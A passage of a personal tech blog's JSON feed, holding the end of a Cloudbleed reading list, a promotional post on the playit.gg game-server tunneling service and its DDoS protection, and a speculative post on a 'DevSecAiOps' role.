href=\"https://blog.cloudflare.com/quantifying-the-impact-of-cloudbleed/\" target=\"_blank\" rel=\"noopener noreferrer\">Quantifying the Impact of \"Cloudbleed\"</a></li>\n<li><a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1139\" target=\"_blank\" rel=\"noopener noreferrer\">Issue 1139: cloudflare: Cloudflare Reverse Proxies are Dumping Uninitialized Memory</a></li>\n<li><a href=\"https://asamborski.github.io/cs558_s17_blog/2017/04/08/cloudbleed.html\" target=\"_blank\" rel=\"noopener noreferrer\">Cloudbleed</a></li>\n<li><a href=\"Ragel State Machine Compiler\" target=\"_blank\" rel=\"noopener noreferrer\">Ragel State Machine Compiler</a></li>\n<li><a href=\"https://arstechnica.com/information-technology/2017/02/serious-cloudflare-bug-exposed-a-potpourri-of-secret-customer-data/\" target=\"_new\">Details about the Cloudflare memory leak incident - Ars Technica</a></li>\n<li><a href=\"https://news.ycombinator.com/item?id=13718752\" target=\"_new\">Discussion on the Cloudflare memory leak incident - Hacker News</a></li>\n<li><a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1139\" target=\"_new\">Initial report by Tavis Ormandy - Project Zero</a></li>\n<li><a href=\"https://github.com/pirate/sites-using-cloudflare\" target=\"_new\">Github - Cloudflare's incident report and timeline</a></li>\n<li><a href=\"https://www.theverge.com/2023/3/12/22228956/cloudflare-outage-down-detector-web-performance\" target=\"_new\">Cloudflare’s bad software deployment led to a big web slowdown</a></li>\n<li><a href=\"https://blog.cloudflare.com/incident-report-on-memory-leak-caused-by-cloudflare-parser-bug/\" target=\"_new\">Incident report on memory leak caused by Cloudflare parser bug</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=GEbn3nHyKnA&amp;t=234s\" target=\"_blank\" rel=\"noopener noreferrer\">How One Line of Code Almost Blew Up the Internet</a> - <a class=\"yt-simple-endpoint style-scope yt-formatted-string\" spellcheck=\"false\" href=\"https://www.youtube.com/@kevinfaang\" dir=\"auto\">Kevin Fang</a></li>\n</ul>",
            "image": "https://blog.thefourcraft.com/media/posts/49/How-One-Line-of-Code-Almost-Blew-Up-the-Internet.png",
            "author": {
                "name": "thefourCraft"
            },
            "tags": [
                   "Zero Trust",
                   "Vulnerability",
                   "Security",
                   "Network",
                   "Google",
                   "Documentary",
                   "Cloudflare"
            ],
            "date_published": "2023-06-13T10:35:08+03:00",
            "date_modified": "2023-06-16T10:13:21+03:00"
        },
        {
            "id": "https://blog.thefourcraft.com/a-deep-dive-into-playitgg/index.html",
            "url": "https://blog.thefourcraft.com/a-deep-dive-into-playitgg/index.html",
            "title": "A Deep Dive into playit.gg",
            "summary": "<p>In the world of online gaming, server infrastructure is a critical component. As players, we often take the technology that makes our online adventures possible for granted. Let's talk about a service revolutionizing how we think about gaming servers: <a href=\"https://playit.gg/\" rel=\"noopener nofollow\" target=\"_blank\">playit.gg</a>.</p>\n",
            "content_html": "<p>In the world of online gaming, server infrastructure is a critical component. As players, we often take the technology that makes our online adventures possible for granted. Let's talk about a service revolutionizing how we think about gaming servers: <a href=\"https://playit.gg/\" rel=\"noopener nofollow\" target=\"_blank\">playit.gg</a>.</p>\n\n<h2>What is playit.gg?</h2>\n<p>playit.gg is a forward-thinking service allowing anyone to create free secure gaming servers. In a world where the cost of maintaining infrastructure can hinder creative endeavors, playit.gg steps up to provide an invaluable resource to the gaming community.</p>\n<p>The platform is not just about cost savings, though. It's also about security, reliability, and performance. And this is where our technical deep dive begins: with the magic of an anycast network.</p>\n<blockquote>\n<div class=\"info-section margin-top\">\n<p>playit.gg is a networking service that make it possible to host game servers at home that anyone across the world can join. We do this through our custom tunneling software. You can find our opensource client <a href=\"https://playit.gg/about\" rel=\"noreferrer\">here</a>. When you launch the playit program, the program will connect to our Anycast Network and assign you a static IP and port. You can then share your static IP and port with friends. When they connect, their connection information will go to the nearest tunnel server and be tunneled to the playit program running on your computer. By tunneling the connection, your friend is able to connect to the server running within your network.</p>\n<p>From the About page on the website :) </p>\n</div>\n</blockquote>\n<h2>What is an Anycast network?</h2>\n<p>Anycast is a network addressing and routing methodology that enables routing inbound requests to different locations, depending on factors like congestion, distance, and link health. In the context of DevOps and network management, anycast offers tremendous advantages.</p>\n<p>In a conventional unicast network, a single IP address is tied to a single device. An IP address can be assigned to multiple devices with anycast, typically servers distributed across different geographical locations. When a user requests an anycast IP address, network protocols determine the best path to one of these servers, usually the closest or least congested.</p>\n<p>This has several implications for system resilience and performance. Anycast networks can handle heavy traffic loads, automatically routing around congestion and spreading demand across multiple servers. They can also improve latency, as users are routed to the nearest server.</p>\n<p>In addition, anycast networks can enhance security. For example, in the event of a Distributed Denial of Service (DDoS) attack, the traffic can be distributed across multiple servers, reducing the risk of any single server being overwhelmed. This is especially important for a gaming service like playit.gg, which needs to maintain uptime and performance even in the face of potential cyberattacks.</p>\n<blockquote>\n<p>An Anycast Network is a network where all of our IP addresses are available at all of our datacenters. When you or a player tries to communicate with a playit tunnel server, your ISP will route your connection to what they consider is the closet datacenter we operate in. ISPs don't always get this right so we're actively working of a new ways to improve this.</p>\n<p>From the About page on the website :) </p>\n</blockquote>\n<h2>How to use playit.gg?</h2>\n<p>Using playit.gg is straightforward. After signing up for an account, you can create your gaming server by following the prompts on the website. You can customize your server to suit your needs, including choosing the game you want to host, the number of players, and other settings.</p>\n<p>Once your server is set up, playit.gg provides an IP address you can share with other players. This IP address is hosted on playit.gg's anycast network, ensuring that your server benefits from resilience, performance, and security offered 100% free by playit.gg.</p>\n<h2>What do you get in the free tier?</h2>\n<p>playit.gg offers both free and premium tiers, with the free tier offering up to 4 TCP ports, 4 UDP ports, and a single firewall. For users on IPv6 networks, playit.gg offers immense flexibility with the ability to use any or all of your 65,000+ public ports on your IP. Additional features like custom domains and dedicated IP addresses are available as add-ons.</p>\n<h2>About DDoS Attacks and playit.gg</h2>\n<p>In 2023, Distributed Denial of Service (DDoS) attacks have become a significant threat to the online gaming industry, significantly reshaping its landscape. These attacks involve overwhelming a network, service, or server with internet traffic, causing it to slow down or crash. In the gaming context, these attacks target the game servers, disrupting the gaming experience for players and potentially leading to substantial financial losses for gaming companies.</p>\n<p>The most direct impact of a DDoS attack on a gaming server is the disruption it causes to the players. Games may become laggy, disconnect frequently, or entirely inaccessible, significantly affecting players' gaming experience. A successful DDoS attack for gaming companies can result in substantial financial losses. These can stem from lost revenue during the attack, the cost of mitigating the attack, and potential compensation to affected players. Frequent or severe DDoS attacks can damage a gaming company’s reputation, losing the player base.</p>\n<p>A service like playit.gg is acutely aware of the potential for DDoS attacks and has implemented measures to protect its users and maintain service quality. When you launch the playit program, the program will connect to playit.gg's Anycast Network and assign you a static IP and port. Your static IP and port can then be shared with friends. When they connect, their connection information will go to the nearest tunnel server and be tunneled to the playit program on your computer. By tunneling the connection, your friends can connect to the server running within your network.</p>\n<h2>What is the best part about playit.gg</h2>\n<p>One of the vital safety benefits of playit.gg is that it hides your IP, meaning that even if there is a DDoS attack, it won't affect your network. The service also lets you turn the \"tunneling\" off anytime by closing the program. Additionally, playit.gg features strong firewalls and better connection handling, further bolstering the service's resilience to DDoS attacks and other potential disruptions.</p>\n<h2>Challenges of DDoS Protection in Playit.gg</h2>\n<p>Despite the advantages of playit.gg's DDoS protection, some challenges come with it. One of the primary issues is the cost of maintaining a robust defense against DDoS attacks. In a message from Patrick, the founder and CEO of playit.gg, he acknowledges that the only viable way to handle these attacks is to invest more money in renting powerful servers. This could be a substantial expenditure, especially given the scale and frequency of the attacks.</p>\n<h2>About DDoS in gaming</h2>\n<p>The gaming industry is increasingly implementing measures to combat DDoS attacks. These include using DDoS protection services, educating players about DDoS attacks, and improving incident response capabilities. These measures aim to ensure the reliability and security of online gaming experiences and to minimize disruption to players​</p>\n<h2>On a Personal note</h2>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex flex-col items-start gap-4 whitespace-pre-wrap break-words\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">\n<p>I deeply enjoy featuring remarkable tools on my blog and introducing them to a global audience. As a financial supporter of the playit.gg project, I cannot stress enough how much I believe in their mission and their service. I highly encourage you to try it out for yourself and perhaps consider becoming a supporter. The gaming community thrives with the support of its passionate members, and every contribution helps ensure the availability of innovative platforms like playit.gg. </p>\n<p>Written with 🥙 and ❤️ by me, ChatGPT, Google Bard &amp; perplexity.ai </p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://blog.thefourcraft.com/media/posts/48/A-Deep-Dive-into-playit.gg.png",
            "author": {
                "name": "thefourCraft"
            },
            "tags": [
                   "playit.gg",
                   "Security",
                   "Product Recommendation",
                   "My Personal Opinion",
                   "DDos",
                   "Cloudflare",
                   "Cloud Security"
            ],
            "date_published": "2023-06-08T10:28:18+03:00",
            "date_modified": "2023-06-15T10:37:10+03:00"
        },
        {
            "id": "https://blog.thefourcraft.com/devsecaiops-the-future/index.html",
            "url": "https://blog.thefourcraft.com/devsecaiops-the-future/index.html",
            "title": "DevSecAiOps The Future",
            "summary": "<p>Imagine a world where artificial intelligence seamlessly integrates and enhances a tech organization's development, security, and operations. This is the world of DevSecAiOps, a hypothetical future role that could revolutionize how we approach technology.</p>\n",
            "content_html": "<p>Imagine a world where artificial intelligence seamlessly integrates and enhances a tech organization's development, security, and operations. This is the world of DevSecAiOps, a hypothetical future role that could revolutionize how we approach technology.</p>\n\n<h2>Defining DevSecAiOps</h2>\n<p>Today, we're familiar with DevSecOps, a methodology that integrates development, security, and operations. Its philosophy promotes closer collaboration between previously siloed lines, resulting in more efficient processes and better end products.</p>\n<p>DevSecAiOps, as the name implies, takes this one step further by incorporating AI into the mix. This means harnessing AI to improve, automate, and innovate across all areas of the DevSecOps process.</p>\n<h2>The Shift Toward AI</h2>\n<p>As AI becomes increasingly prevalent and sophisticated, its potential applications in DevOps are vast. From automating mundane tasks and speeding up development cycles to enhancing security measures and optimizing system operations, AI is a game-changer.</p>\n<h3>AI in Development</h3>\n<p>AI has the potential to streamline the development process significantly. It can automate coding, testing, debugging, and more. By reducing the human effort required for these tasks, developers can focus more on their work's strategic, creative, and complex aspects.</p>\n<h3>AI in Security</h3>\n<p>In the security realm, AI can be used to predict and identify threats more effectively. It can analyze patterns, detect anomalies, and respond to incidents faster than humanly possible. With AI, we can proactively mitigate risks and enhance the overall security posture of our systems.</p>\n<h3>AI in Operations</h3>\n<p>Regarding operations, AI can optimize resource allocation, system performance, and incident response. Predictive analytics can foresee potential issues, while automation can handle routine tasks, freeing human resources for more complex challenges.</p>\n<h2>Imagining the DevSecAiOps Role</h2>\n<p>The DevSecAiOps role would need a deep understanding of development, security, and operations and a solid grasp of AI. They must know how to apply AI to benefit these areas and align with the organization's goals.</p>\n<p>However, this doesn't mean every DevSecAiOps professional must be an AI expert. They would need a foundational understanding and the ability to work with AI specialists. Collaboration and continuous learning would be critical aspects of this role.</p>\n<h2>The Future of DevSecAiOps</h2>\n<p>As organizations embrace digital transformation, the demand for roles like DevSecAiOps will likely increase. The future of this role hinges on how rapidly AI evolves and how quickly organizations can adapt to these changes.</p>\n<p>Given the increasing reliance on AI in various industries, it's not far-fetched to imagine a role like DevSecAiOps emerging soon. This role is at the intersection of technology and innovation, poised to redefine the tech landscape.</p>\n<p>In conclusion, while DevSecAiOps doesn't exist today, it's a concept worth exploring. As the tech world evolves, roles like this could become a reality. The fusion of development, security, AI, and operations could be the next step in evolving tech roles, taking us into an exciting, uncharted future.</p>",
            "image": "https://blog.thefourcraft.com/media/posts/46/DevSecAiOps-The-Future.png",
            "author": {
                "name": "thefourCraft"
            },
            "tags": [
                   "artificial intelligence",
                   "The Future",
                   "Security",
                   "My Personal Opinion",
                   "DevOps",
                   "AI"
            ],
            "date_published": "2023-06-08T08:00:00+03:00",
            "date_modified": "2023-06-11T08:50:00+03:00"
        }
    ]
}
